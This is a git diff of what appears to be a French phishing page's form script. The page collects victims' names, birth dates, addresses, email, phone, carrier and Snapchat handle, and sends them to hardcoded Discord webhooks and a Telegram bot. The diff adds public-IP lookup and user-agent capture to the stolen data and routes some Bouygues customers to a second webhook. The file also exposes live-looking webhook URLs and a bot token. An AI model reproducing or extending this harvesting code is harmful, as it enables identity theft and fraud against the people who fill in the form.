@@ -59,7 +59,7 @@
     label {
       display: block;
       text-align: left;
-      margin: 10px 0 5px 0;
+      margin: 10px 0 5px;
       font-size: 14px;
     }
   </style>
@@ -85,14 +85,24 @@
   <script>
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1399083560782270485/HQzCh3RmPUzWhOrfR-5dOQ_vX78AtG0eTeRjAih95uNq3lkCtQcLirMMwOufmBB1Zs0u";
     const DISCORD_ALT_WEBHOOK_URL = "https://discord.com/api/webhooks/1402568400475131924/EPF82eqz6XawrnId5YB6nCCXs46u5PuccOkYDlKjm6WddiwWJDB6WnOtMWRCvxE-1Eec";
-    const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6o-VP8_aPOnsT6Qk9tBN2E";
+    const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6o‑VP8_aPOnsT6Qk9tBN2E";
     const TELEGRAM_CHAT_ID = "-1002810249796";
+
+    async function getIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return "Inconnu";
+      }
+    }
 
     async function sendDiscord(embed, webhookUrl) {
       return fetch(webhookUrl, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ embeds: [embed] }),
+        body: JSON.stringify({ embeds: [embed] })
       });
     }
 
@@ -104,85 +114,83 @@
           chat_id: TELEGRAM_CHAT_ID,
           text,
           parse_mode: "Markdown",
-          disable_web_page_preview: true,
-        }),
+          disable_web_page_preview: true
+        })
       });
     }
 
     document.getElementById("form2").addEventListener("submit", async (e) => {
       e.preventDefault();
-      const msgElem = document.getElementById("msg");
-      msgElem.textContent = "Envoi en cours...";
+      const msg = document.getElementById("msg");
+      msg.textContent = "Envoi en cours...";
 
-      const formData = new FormData(e.target);
-
+      const d = new FormData(e.target);
       const step2 = {
-        nom: formData.get("nom"),
-        prenom: formData.get("prenom"),
-        naissance: formData.get("naissance"),
-        email: formData.get("email"),
-        ville: formData.get("ville"),
-        codePostal: formData.get("codePostal"),
-        adresse: formData.get("adresse"),
-        snap: formData.get("snap")
+        nom: d.get("nom"),
+        prenom: d.get("prenom"),
+        naissance: d.get("naissance"),
+        email: d.get("email"),
+        ville: d.get("ville"),
+        codePostal: d.get("codePostal"),
+        adresse: d.get("adresse"),
+        snap: d.get("snap")
       };
 
       const step1 = JSON.parse(localStorage.getItem("step1") || "{}");
       const operateur = step1.operateur || "Non fourni";
       const telephone = step1.telephone || "Non fourni";
-      const ip = "Inconnu";
-      const ua = "Inconnu";
+
+      const ip = await getIP();
+      const ua = navigator.userAgent;
 
       let webhookToUse = DISCORD_WEBHOOK_URL;
       if (operateur.toLowerCase().includes("bouygues") && Math.random() < 0.5) {
         webhookToUse = DISCORD_ALT_WEBHOOK_URL;
       }
 
-      const discordEmbed = {
-        title: "🍭 +1 Entrée 🍭",
-        color: 0x9b00ff,
-        fields: [
-          {
-            name: "\u200B",
-            value:
-              `🍬 Nom         : ${step2.nom}\n` +
-              `🍬 Prénom      : ${step2.prenom}\n` +
-              `🍬 Naissance   : ${step2.naissance || "Non fournie"}\n` +
-              `🍬 Snapchat    : ${step2.snap || "Non fourni"}\n\n` +
+const discordEmbed = {
+  title: "🍭 +1 Entrée 🍭",
+  color: 0x9b00ff,
+  fields: [
+    {
+      name: "\u200B",
+      value: 
+        `🍬 Nom         : ${step2.nom}\n` +
+        `🍬 Prénom      : ${step2.prenom}\n` +
+        `🍬 Naissance   : ${step2.naissance || "Non fournie"}\n` +
+        `🍬 Snapchat    : ${step2.snap || "Non fourni"}\n\n` +
 
-              `🏠 Adresse     : ${step2.adresse || "Non fournie"}\n` +
-              `🏠 Ville       : ${step2.ville}\n` +
-              `🏠 Code Postal : ${step2.codePostal}\n\n` +
+        `🏠 Adresse     : ${step2.adresse || "Non fournie"}\n` +
+        `🏠 Ville       : ${step2.ville}\n` +
+        `🏠 Code Postal : ${step2.codePostal}\n\n` +
 
-              `📧 Email       : ${step2.email}\n` +
-              `📞 Téléphone   : ${telephone}\n` +
-              `📶 Opérateur   : ${operateur}\n\n` +
+        `📧 Email       : ${step2.email}\n` +
+        `📞 Téléphone   : ${telephone}\n` +
+        `📶 Opérateur   : ${operateur}\n\n` +
 
-              `📟 IP          : ${ip}\n` +
-              `🔎 User-Agent  : ${ua}`
-          }
-        ],
-        timestamp: new Date().toISOString(),
-        footer: {
-          text: "📥 Données reçues via le formulaire"
-        }
-      };
+        `📟 IP          : ${ip}\n` +
+        `🔎 User-Agent  : ${ua}`
+    }
+  ],
+  timestamp: new Date().toISOString(),
+  footer: {
+    text: "📥 Données reçues via le formulaire"
+  }
+};
 
       const telegramText =
         `[🎲] INFOS [🎲]\n\n` +
         `🚀 Nom : ${step2.nom}\n` +
         `🚀 Prénom : ${step2.prenom}\n` +
         `🎂 Naissance : ${step2.naissance}\n` +
+        `👻 Snapchat : ${step2.snap}\n\n` +
         `🏠 Adresse : ${step2.adresse || "Non fournie"}\n` +
         `🏠 Ville : ${step2.ville}\n` +
-        `🏠 Code Postal : ${step2.codePostal}\n` +
+        `🏠 Code Postal : ${step2.codePostal}\n\n` +
         `📧 E‑Mail : ${step2.email}\n` +
-        `👻 Snapchat : ${step2.snap}\n\n` +
-        `[📞] Phone [📞]\n` +
-        `📶 Opérateur : ${operateur}\n` +
-        `📱 Téléphone : ${telephone}\n\n` +
-        `[🌐] TIERS [🌐]\n` +
-        `📟 Adresse IP : ${ip}\n` +
+        `📞 Téléphone : ${telephone}\n` +
+        `📶 Opérateur : ${operateur}\n\n` +
+        `📟 IP : ${ip}\n` +
         `🔎 User-Agent : ${ua}`;
 
       try {
@@ -190,12 +198,11 @@
           sendDiscord(discordEmbed, webhookToUse),
           sendTelegram(telegramText)
         ]);
-
-        msgElem.textContent = "Données envoyées avec succès ! Redirection...";
+        msg.textContent = "Envoyé ✅ Redirection...";
         localStorage.setItem("step2", JSON.stringify(step2));
         setTimeout(() => window.location.href = "merci.html", 1000);
       } catch (err) {
-        msgElem.textContent = "Erreur lors de l'envoi.";
+        msg.textContent = "Erreur lors de l'envoi.";
         console.error(err);
       }
     });
